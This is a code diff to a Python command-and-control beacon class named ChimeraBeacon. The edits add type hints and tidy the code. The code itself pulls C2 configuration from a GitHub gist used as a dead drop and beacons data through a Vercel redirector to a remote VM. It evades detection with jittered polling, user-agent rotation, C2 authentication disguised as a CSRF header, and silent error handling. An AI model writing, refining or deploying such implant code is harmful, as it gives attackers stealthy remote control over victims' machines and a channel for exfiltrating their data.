@@ -4,6 +4,7 @@ import json
 import base64
 import time
 import random
+from typing import Any, Dict, Optional
 
 class ChimeraBeacon:
     """
@@ -11,22 +12,22 @@ class ChimeraBeacon:
     Implements jittered polling, fallback endpoints, and user-agent rotation.
     """
 
-    def __init__(self, gist_id: str, github_token: str = None):
+    def __init__(self, gist_id: str, github_token: Optional[str] = None):
         self.gist_url = f"https://api.github.com/gists/{gist_id}"
         self.headers = {"Accept": "application/vnd.github+json"}
         if github_token:
             self.headers["Authorization"] = f"Bearer {github_token}"
 
-        self._current_endpoint = None
-        self._session_key = None
+        self._current_endpoint: Optional[str] = None
+        self._session_key: str = ""
 
-    def fetch_config(self) -> dict:
+    def fetch_config(self) -> Dict[str, Any]:
         """Pull current C2 config from dead drop."""
         resp = requests.get(self.gist_url, headers=self.headers, timeout=15)
         resp.raise_for_status()
         gist = resp.json()
 
-        for fname, fdata in gist["files"].items():
+        for fdata in gist["files"].values():
             content = fdata.get("content", "")
             if "integrity" in content:
                 parsed = json.loads(content)
@@ -38,15 +39,15 @@ class ChimeraBeacon:
     def beacon(self, payload: bytes) -> bytes:
         """Send beacon data to current C2 endpoint via Vercel redirector."""
         if not self._current_endpoint:
-            config = self.fetch_config()
-            self._current_endpoint = config["url"]
-            self._session_key = config.get("key", "")
+            config: Dict[str, Any] = self.fetch_config()
+            self._current_endpoint = str(config["url"])
+            self._session_key = str(config.get("key", "") or "")
 
         # Route through /api/ which Vercel rewrites to Fly VM
         url = f"{self._current_endpoint}/api/beacon"
-        headers = {
+        headers: Dict[str, str] = {
             "Content-Type": "application/octet-stream",
-            "X-CSRF-Token": self._session_key,  # C2 auth disguised as CSRF
+            "X-CSRF-Token": self._session_key,
             "User-Agent": self._random_ua()
         }
 
@@ -79,7 +80,7 @@ class ChimeraBeacon:
                 payload = self._build_payload()
                 response = self.beacon(payload)
                 self._handle_response(response)
-            except Exception as e:
+            except Exception:
                 pass  # stay quiet, retry next cycle
 
             sleep_time = interval * (1 + random.uniform(-jitter, jitter))
